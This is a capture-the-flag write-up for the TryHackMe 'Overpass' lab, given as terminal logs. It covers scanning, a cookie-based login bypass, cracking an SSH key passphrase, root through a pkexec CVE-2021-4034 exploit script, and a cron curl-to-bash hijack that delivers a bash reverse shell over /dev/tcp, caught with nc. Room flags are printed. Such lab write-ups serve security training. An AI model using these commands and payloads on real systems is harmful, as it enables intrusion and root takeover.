```terminal
└─# nmap  -sV -Pn -p- --min-rate 5000 $ip
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=9/29%Time=65169DBF%P=x86_64-pc-linux-gnu%r(HTTP
SF:Options,BA,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nConten
SF:t-Length:\x202431\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLa
SF:st-Modified:\x20Sat,\x2027\x20Jun\x202020\x2003:49:33\x20GMT\r\nDate:\x
SF:20Fri,\x2029\x20Sep\x202023\x2021:17:57\x20GMT\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Only 2 port

fuzz using dirb and found this `http://10.10.35.88/admin/`
```
                       [Status: 200, Size: 2431, Words: 582, Lines: 53, Duration: 703ms]
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 751ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 2915ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1438ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1837ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 711ms]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1528ms]

```

Vulnerable line
```js
 const creds = { username: usernameBox.value, password: passwordBox.value }
 const response = await postData("/api/login", creds)
 const statusOrCookie = await response.text()
 if (statusOrCookie === "Incorrect credentials") {
 loginStatus.textContent = "Incorrect Credentials"
 passwordBox.value=""
 } else {
 Cookies.set("SessionToken",statusOrCookie)
 window.location = "/admin"
 }
}
```
Now i will use the curl command and cookie to set it

```terminal
└─# curl -L -b "SessionToken=randomcookie" http://$ip/admin/
   <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>

</html>        

```
I will use `ssh2john` to crack it
```terminal
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/rooms]
└─# john  id.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
james13          (id_rsa)

```

```
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/rooms]
└─# ssh james@$ip -i id_rsa
Enter passphrase for key 'id_rsa':

james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

```

# PrivEsc
First i will try `Sudo` and `SUID`
No SUDO
```terminal
sudo: 1 incorrect password attempt
james@overpass-prod:~$ find / -type f -perm /4000 -ls 2>/dev/null
   262212     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   262297     28 -rwsr-xr-x   1 root     root        26696 Jan  8  2020 /bin/umount
   262279     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   262239     44 -rwsr-xr-x   1 root     root        43088 Jan  8  2020 /bin/mount
   262263     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
  1050459     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
  1050408     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
  1050461     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
  1050806    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
  1050681     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
  1050701     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
  1050842     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
  1050664     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
  1050554     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
```
for SUID i found pkexec
Becoming root 1st

```
james@overpass-prod:/tmp/Priv$ python3 CVE-2021-4034.py 
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f8af6a65000 at 0x7f8af55107b8>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
root
thm{7f336f8c359dbac18d54fdd64ea753bb}

```

2nd Methode: Crontab

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```
I think here i need to add the overpass.thm and then create a listner on my local vm 
```terminal
james@overpass-prod:/tmp/Priv$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


```
Back on my attacker machine, I set up a directory structure like they have: `overpass.thm/downloads/src/buildscript.sh`
```
mkdir -p www/downloads/src
cat buildscript.sh
#!/bin/bash
bash -i >& /dev/tcp/{My Machine's IP}/4444 0>&1
```
Now opened a python server on that directory also a listener in another tab

Now replace the victim IP in /etc/hosts with my IP
```
james@overpass-prod:/tmp/Priv$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
attackerIP overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

On Attacker
┌──(root㉿bloman)-[/home/…/CTFs/TryHackMe/rooms/www]
└─# ls
downloads
                                                                     
┌──(root㉿bloman)-[/home/…/CTFs/TryHackMe/rooms/www]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.35.88 - - [29/Sep/2023 06:56:56] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

and 

┌──(root㉿bloman)-[/home/bloman]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.4.26.216] from (UNKNOWN) [10.10.35.88] 59492
bash: cannot set terminal process group (2585): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# 

I am root Now



```